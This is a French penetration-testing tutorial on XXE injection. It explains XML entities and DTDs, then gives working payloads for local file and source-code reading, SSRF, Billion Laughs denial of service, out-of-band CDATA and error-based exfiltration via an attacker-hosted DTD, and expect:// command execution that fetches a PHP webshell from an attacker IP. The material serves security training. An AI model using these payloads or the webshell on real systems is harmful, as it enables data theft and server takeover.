# XXE Injection

## Pourquoi

Le XML a beau paraître démodé face au JSON, il reste omniprésent : APIs SOAP, exports de configuration, formulaires de contact, imports de documents Office, flux SAML. Et tant qu'une application analyse du XML fourni par un utilisateur avec une bibliothèque qui résout les entités externes par défaut, elle ouvre une porte que l'OWASP classe dans son Top 10 depuis des années : l'injection XXE (XML External Entity).

Le principe est presque déroutant de simplicité. Le format XML permet de définir des « entités », l'équivalent de variables, et certaines d'entre elles peuvent pointer vers une ressource externe : un fichier local, une URL, un flux applicatif. Si le parseur du serveur résout ces références sans restriction, on peut lui faire lire n'importe quel fichier accessible avec les droits du processus, sonder son réseau interne (SSRF), l'épuiser en mémoire (déni de service), et dans certains cas rares obtenir l'exécution de commandes.

{% hint style="danger" %}
Ce n'est pas une vulnérabilité de niche. Dès qu'un back-end accepte du XML en entrée (formulaire, API, upload de document), il vaut la peine de tester le XXE, même si l'application semble n'utiliser XML qu'en coulisses.
{% endhint %}

## Comment ça marche

### Rappels sur la structure XML

XML (Extensible Markup Language) est un langage de balisage pensé pour structurer et transporter des données, pas pour les afficher. Un document XML forme un arbre : un élément racine contient des éléments enfants, chacun délimité par une balise ouvrante et une balise fermante.

Voici un document représentant un e-mail, qui servira de fil rouge pour le reste de la page :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2024</date>
  <time>10:00 am UTC</time>
  <sender>contact@societe-cible.local</sender>
  <recipients>
    <to>rh@societe-cible.local</to>
    <cc>
        <to>facturation@societe-cible.local</to>
        <to>paie@societe-cible.local</to>
    </cc>
  </recipients>
  <body>
  Bonjour,
      Merci de me transmettre la facture du paiement effectué le 1er janvier.
  Cordialement,
  Jean
  </body>
</email>
```

Quelques termes reviennent constamment quand on parle de XML, autant les fixer tout de suite :

| Terme | Ce que c'est | Exemple |
|---|---|---|
| Tag (balise) | La clé, entourée de `<` et `>` | `<date>` |
| Entity (entité) | Une variable XML, entourée de `&` et `;` | `&lt;` |
| Element (élément) | Une balise et son contenu, racine ou enfant | `<date>01-01-2024</date>` |
| Attribute (attribut) | Une propriété optionnelle portée par une balise | `version="1.0"` |
| Declaration (déclaration) | La première ligne du document, version et encodage | `<?xml version="1.0" encoding="UTF-8"?>` |

Certains caractères ont un sens spécial dans la grammaire XML : `<`, `>`, `&` et `"`. Pour les utiliser tels quels dans une valeur, il faut les échapper avec leurs entités prédéfinies (`&lt;`, `&gt;`, `&amp;`, `&quot;`). C'est un détail qui aura de l'importance plus loin, quand on essaiera de faire remonter le contenu de fichiers qui contiennent justement ces caractères.

### La DTD, le schéma du document

Une DTD (Document Type Definition) décrit la structure attendue d'un document XML : quels éléments existent, quels enfants ils peuvent avoir, dans quel ordre. Elle peut être écrite directement dans le document, juste après la déclaration, ou vivre dans un fichier séparé référencé avec le mot-clé `SYSTEM` :

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

Référence vers un fichier DTD externe local :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

Ou vers une DTD hébergée à distance :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://societe-cible.local/email.dtd">
```

Le mécanisme rappelle celui d'une page HTML qui va chercher son CSS ou son JavaScript ailleurs : le document principal ne fait que pointer vers une ressource externe, chargée au moment du traitement.

### Les entités, et pourquoi elles sont le cœur du problème

Une DTD peut définir des entités internes, de simples variables qui évitent de répéter une valeur :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY societe "Societe Cible SARL">
]>
```

Une fois déclarée, l'entité se référence avec `&societe;`, et le parseur la remplace par sa valeur partout où elle apparaît. Jusque-là, rien de dangereux.

Le tournant survient avec les entités externes, toujours introduites par `SYSTEM`, mais suivies cette fois d'un chemin de fichier ou d'une URL plutôt que d'une valeur littérale :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY societe SYSTEM "http://localhost/societe.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

{% hint style="info" %}
Le mot-clé `PUBLIC` existe aussi, en général réservé à des identifiants publics normalisés (comme un code de langue). Dans la pratique offensive, `SYSTEM` couvre l'immense majorité des cas et c'est celui qu'on utilisera partout dans cette page.
{% endhint %}

Quand le parseur croise `&signature;`, il va chercher le contenu du fichier `signature.txt` et l'injecte à la place. Et voilà tout le problème : si l'application traite ce XML côté serveur, comme c'est le cas pour une API SOAP ou un formulaire web, une entité externe peut pointer vers n'importe quel fichier du serveur. Ce que le parseur nous renvoie ensuite dépend uniquement de ce qu'on choisit de référencer.

## En pratique

### Repérer une cible potentielle

La première étape, c'est de trouver un point d'entrée qui transporte du XML depuis le client vers le serveur. Un formulaire de contact classique en est un bon exemple : côté visuel, rien ne distingue un champ « nom » d'un autre, mais en interceptant la requête avec Burp, on découvre parfois que les données sont sérialisées en XML plutôt qu'en `application/x-www-form-urlencoded` ou en JSON.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name>Jean Dupont</name>
  <tel>0600000000</tel>
  <email>jean@test.local</email>
  <message>Bonjour, j'ai une question.</message>
</root>
```

{% hint style="success" %}
Si une application n'accepte que du JSON en apparence, ça vaut le coup d'essayer de forcer le `Content-Type` à `application/xml` et de convertir le corps de la requête en XML équivalent. Certains frameworks acceptent silencieusement les deux formats, et on découvre alors une surface XXE que personne n'avait anticipée.
{% endhint %}

Avant de chercher à lire un fichier, il faut d'abord repérer quel élément de la réponse reflète une valeur qu'on contrôle. Dans l'exemple ci-dessus, si le serveur répond quelque chose comme « Merci, un e-mail a été envoyé à jean@test.local », c'est la valeur de `<email>` qui remonte dans la réponse. C'est cet élément qu'on va cibler pour observer le résultat de nos entités.

Pour confirmer que le parseur traite bien nos définitions, on commence par une entité interne inoffensive, en l'ajoutant juste après la déclaration XML :

```xml
<!DOCTYPE root [
  <!ENTITY societe "Societe Cible SARL">
]>
```

{% hint style="info" %}
Si la requête déclare déjà un `DOCTYPE`, il suffit d'ajouter la ligne `ENTITY` à l'intérieur des crochets existants plutôt que d'en créer un nouveau.
{% endhint %}

Puis on remplace la valeur du champ reflété par `&societe;` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY societe "Societe Cible SARL">
]>
<root>
  <name>Jean Dupont</name>
  <tel>0600000000</tel>
  <email>&societe;</email>
  <message>Bonjour, j'ai une question.</message>
</root>
```

Si la réponse du serveur affiche « Societe Cible SARL » à la place de l'adresse e-mail attendue, c'est le signal qu'on cherchait : le parseur résout les entités qu'on définit. Une application non vulnérable afficherait `&societe;` tel quel, comme du texte brut. À partir de ce point, on sait qu'on peut injecter des entités externes.

### Lire des fichiers locaux

Le passage à la lecture de fichiers ne change presque rien à la syntaxe, il suffit d'ajouter `SYSTEM` suivi d'un chemin :

```xml
<!DOCTYPE root [
  <!ENTITY societe SYSTEM "file:///etc/passwd">
]>
```

En envoyant cette requête avec `&societe;` toujours placé dans le champ reflété, le contenu de `/etc/passwd` remonte dans la réponse HTTP. C'est la démonstration la plus classique du XXE, mais l'intérêt réel dépasse largement ce fichier de démonstration : configurations d'applications avec identifiants en clair, clés privées SSH (`id_rsa`), fichiers de connexion à une base de données. Tout ce qui est lisible par le compte qui fait tourner le serveur web devient accessible.

{% hint style="success" %}
Sur certaines stacks Java, référencer un répertoire plutôt qu'un fichier renvoie parfois un listing du contenu, ce qui aide à repérer des fichiers intéressants sans deviner leurs noms.
{% endhint %}

Une fois qu'on a une lecture de fichier arbitraire, la logique de la suite ressemble beaucoup au travail qu'on fait sur une inclusion de fichier local (LFI) : chercher les fichiers de configuration connus, remonter l'arborescence pour comprendre le contexte applicatif, chasser les secrets.

### Lire du code source

Récupérer le code source d'une application ouvre la voie à un audit en boîte blanche, avec toute la visibilité que ça donne sur d'autres failles potentielles, et souvent des secrets codés en dur (clés d'API, mots de passe de base de données).

Le souci, c'est qu'un fichier source contient presque toujours des caractères comme `<`, `>` ou `&`, qui cassent la structure XML dès qu'ils sont injectés tels quels dans une valeur d'entité. Référencer directement `file:///var/www/html/index.php` échoue purement et simplement, la réponse ne contient rien d'exploitable.

Sur une stack PHP, le wrapper `php://filter` sauve la mise. En lui demandant d'encoder le fichier en base64 avant de le renvoyer, on obtient une chaîne qui ne contient plus aucun caractère spécial :

```xml
<!DOCTYPE root [
  <!ENTITY societe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

La réponse contient alors une longue chaîne base64, qu'il suffit de décoder (l'onglet Inspector de Burp le fait directement) pour retrouver le fichier source en clair.

{% hint style="warning" %}
Cette astuce est spécifique à PHP. Sur d'autres stacks (Java, .NET, Node), il faudra la méthode CDATA détaillée plus loin, qui fonctionne indépendamment du langage back-end.
{% endhint %}

### Exécution de code à distance

Le XXE mène rarement directement à l'exécution de code, mais quelques pistes existent. La plus fiable reste de chercher des clés SSH exploitables via la lecture de fichiers, ou de tenter un vol de hash NTLM sur une cible Windows en pointant une entité vers un partage SMB qu'on contrôle.

Sur une stack PHP avec le module `expect` installé et activé (ce qui reste rare en environnement de production), on peut exécuter des commandes directement :

```xml
<!DOCTYPE root [
  <!ENTITY societe SYSTEM "expect://id">
]>
```

Pour aller plus loin qu'une commande basique, l'approche la plus robuste consiste à récupérer un webshell depuis un serveur qu'on contrôle plutôt que d'essayer de faire tenir une commande complexe dans la syntaxe XML :

```bash
# Depuis Exegol - préparation d'un webshell PHP minimal
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY societe SYSTEM "expect://curl$IFS-O$IFS'http://<IP_ATTAQUANT>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&societe;</email>
<message></message>
</root>
```

{% hint style="warning" %}
Les espaces cassent la syntaxe XML dans ce contexte, d'où le remplacement systématique par `$IFS`. D'autres caractères posent le même problème, notamment `|`, `>` et `{` : mieux vaut les éviter dans la commande injectée.
{% endhint %}

{% hint style="danger" %}
Le module `expect` est désactivé par défaut sur la quasi-totalité des installations PHP modernes. Cette technique fonctionne surtout en environnement de lab volontairement mal configuré. En engagement réel, la lecture de fichiers et de code source reste de loin la voie la plus fiable pour progresser depuis un XXE.
{% endhint %}

### SSRF et déni de service

Une entité externe qui pointe vers une URL plutôt qu'un fichier transforme le XXE en primitive SSRF classique : sonder les ports ouverts sur `localhost`, atteindre des services internes qui ne sont pas censés être exposés, interroger des API de métadonnées cloud. Les techniques recoupent largement celles employées sur n'importe quel SSRF trouvé par un autre biais.

L'autre détournement classique est le déni de service par expansion exponentielle d'entités, connu sous le nom de « Billion Laughs » :

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Chaque entité référence dix fois la précédente. Avec dix niveaux d'imbrication, l'entité finale représente dix milliards de répétitions de la chaîne `DOS`, de quoi épuiser la mémoire du parseur qui tente de la résoudre entièrement en mémoire.

{% hint style="info" %}
Les serveurs modernes (Apache et la plupart des parseurs XML récents) détectent les boucles d'auto-référence et les bloquent. Cette attaque a surtout une valeur pédagogique aujourd'hui, mais elle reste bonne à connaître face à des stacks anciennes ou mal maintenues.
{% endhint %}

### Exfiltration avancée avec CDATA

La méthode `php://filter` a ses limites : elle ne fonctionne que sur PHP, et pas du tout sur des fichiers binaires. Pour extraire n'importe quel contenu, y compris du binaire, indépendamment du langage back-end, la solution passe par la section `CDATA` du XML, qui indique au parseur de traiter tout ce qu'elle contient comme du texte brut, sans interpréter les caractères spéciaux.

L'idée intuitive serait de définir trois entités internes : le début du bloc CDATA, le fichier à lire, et la fin du bloc, puis de les concaténer :

```xml
<!DOCTYPE root [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

{% hint style="warning" %}
Cette version ne fonctionne pas. La grammaire XML interdit de mélanger une entité interne et une entité externe dans une même référence composée : `&begin;` est interne, `&file;` est externe, et le parseur refuse de les joindre.
{% endhint %}

Le contournement passe par les entités paramètres (parameter entities), une variante spéciale préfixée par `%`, utilisable uniquement à l'intérieur d'une DTD. Leur particularité : quand elles sont toutes déclarées comme provenant d'une source externe (typiquement une DTD hébergée sur notre propre serveur), elles peuvent être concaténées sans restriction :

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Concrètement, on héberge cette ligne dans un fichier DTD sur notre machine :

```bash
# Depuis Exegol - préparation et hébergement de la DTD malveillante
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Puis on construit le payload qui référence cette DTD externe et enchaîne les entités paramètres nécessaires :

```xml
<!DOCTYPE root [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://<IP_ATTAQUANT>:8000/xxe.dtd">
  %xxe;
]>
```

Et on référence `&joined;` (défini côté serveur distant, résolu dans notre DTD) à la place du champ reflété :

```xml
<email>&joined;</email>
```

Le fichier `submitDetails.php` remonte alors intégralement, sans passer par un encodage base64, ce qui simplifie beaucoup la revue de code quand il faut parcourir plusieurs fichiers à la recherche de secrets.

{% hint style="info" %}
Certains parseurs modernes bloquent la lecture de fichiers qui se référencent eux-mêmes en boucle (protection anti-DoS héritée du problème Billion Laughs), ce qui peut empêcher de lire directement le fichier qui contient le point d'entrée XXE. Cibler d'autres fichiers de la même application contourne généralement le problème.
{% endhint %}

### XXE basé sur les erreurs

Il arrive qu'aucun élément de la réponse ne reflète une valeur qu'on contrôle : dans ce cas, même une entité qui se résout correctement ne produit aucune sortie visible. Avant de conclure à une impasse totale, il vaut la peine de vérifier si l'application affiche ses erreurs runtime (PHP mal configuré en mode debug, notamment).

On force d'abord une erreur volontairement, en cassant la syntaxe XML (une balise mal fermée, une entité qui n'existe pas) pour observer si le serveur en révèle le détail dans sa réponse. Si un chemin absolu ou une trace d'erreur PHP apparaît, l'exploitation devient possible malgré l'absence de reflet direct.

La technique consiste à héberger une DTD qui définit une entité paramètre pointant vers le fichier ciblé, puis à la référencer à l'intérieur d'une entité paramètre invalide, pour forcer le parseur à afficher le message d'erreur en y incluant le contenu du fichier :

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

L'entité `%nonExistingEntity;` n'existe nulle part. Le parseur, en tentant de la résoudre, échoue et remonte un message d'erreur qui embarque au passage la valeur de `%file;` concaténée juste à côté, exactement comme dans la méthode CDATA où trois entités paramètres étaient jointes.

Il ne reste plus qu'à référencer cette DTD externe depuis la requête envoyée à l'application :

```xml
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<IP_ATTAQUANT>:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Le message d'erreur renvoyé par le serveur contient alors le contenu de `/etc/hosts`, extrait sans jamais avoir eu besoin d'un élément XML qui reflète normalement une valeur.

{% hint style="info" %}
Cette méthode fonctionne aussi pour du code source, mais elle est moins fiable que l'approche CDATA : les messages d'erreur sont souvent tronqués à une certaine longueur, et certains caractères spéciaux dans le fichier ciblé peuvent casser le format de l'erreur elle-même avant qu'elle ne soit complètement générée.
{% endhint %}

## Pièges et galères

- **Confondre entité interne et externe** : tant qu'on n'a pas confirmé qu'une entité interne toute simple se résout dans la réponse, inutile de passer directement à `SYSTEM`. Valider l'étape de base évite de perdre du temps à déboguer un payload complexe alors que le problème est ailleurs (mauvais élément ciblé, DOCTYPE mal placé)
- **Oublier qu'un fichier source casse le XML** : référencer `file:///var/www/html/index.php` directement échoue silencieusement dès que le fichier contient un `<` ou un `&`. Le réflexe doit être immédiat : base64 (PHP uniquement) ou CDATA (universel)
- **Mélanger entités internes et externes dans une concaténation** : la tentative naturelle de coller `begin`, `file` et `end` en entités internes échoue toujours à cause de la règle qui interdit ce mélange. Les entités paramètres externes sont la seule voie
- **Espaces et caractères spéciaux dans un payload `expect://`** : la syntaxe XML tolère mal certains caractères dans une valeur d'entité. `$IFS` remplace les espaces, et il faut éviter `|`, `>`, `{` dans la commande injectée
- **S'attendre à ce que `expect` soit toujours disponible** : ce module PHP est désactivé par défaut sur la quasi-totalité des serveurs modernes. Ne pas y passer trop de temps si les premières tentatives échouent, la lecture de fichiers reste la voie la plus productive
- **Chercher un XXE uniquement là où le Content-Type annonce déjà du XML** : certaines applications acceptent silencieusement du XML même quand le format par défaut est JSON. Forcer le `Content-Type` et convertir le corps de la requête permet de découvrir des surfaces insoupçonnées

## Retour terrain

En engagement réel, le XXE se cache rarement dans un endpoint qui s'appelle `/xml-endpoint`. Il se trouve dans des recoins qu'on oublierait facilement de tester : l'import d'un fichier Office ou OpenDocument (ces formats sont des archives ZIP contenant du XML), un flux SAML lors d'une authentification SSO, une API SOAP héritée qu'un vieux partenaire commercial continue d'utiliser, ou un simple export de configuration qu'une application accepte de réimporter.

La première chose à faire face à un formulaire quelconque reste d'intercepter la requête et de regarder honnêtement le `Content-Type`. Si c'est du XML, même sur un formulaire de contact anodin, le réflexe de tester l'injection d'entité doit être systématique. Et quand la réponse ne reflète rien d'exploitable, ne pas s'arrêter là : forcer une erreur coûte une requête, et ça peut révéler une voie d'exfiltration complète.

Sur le plan défensif, ce qui frappe le plus en revue de code, c'est à quel point la faille tient souvent à une seule ligne de configuration oubliée : la plupart des parseurs XML modernes (libxml2, Xerces, les bibliothèques .NET récentes) désactivent la résolution d'entités externes par défaut depuis plusieurs années. Le XXE qu'on trouve encore aujourd'hui vient presque toujours d'un flag explicitement réactivé, d'une dépendance ancienne jamais mise à jour, ou d'un morceau de code copié depuis un vieux tutoriel qui datait d'avant ce changement de défaut.

## Mémo express

| Objectif | Payload |
|---|---|
| Confirmer la résolution d'entités | `<!ENTITY test "valeur">` puis `&test;` dans le champ reflété |
| Lire un fichier local | `<!ENTITY x SYSTEM "file:///etc/passwd">` |
| Lire du code source PHP (base64) | `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=fichier.php">` |
| RCE (module expect requis) | `<!ENTITY x SYSTEM "expect://id">` |
| Exfiltration universelle (CDATA) | Parameter entities + DTD externe hébergée, `%begin;%file;%end;` |
| Exfiltration par erreur | `<!ENTITY % error "<!ENTITY c SYSTEM '%bidon;/%file;'>">` |
| DoS (Billion Laughs) | Entités imbriquées se référençant en cascade |
| Héberger une DTD malveillante | `python3 -m http.server 8000` |

***
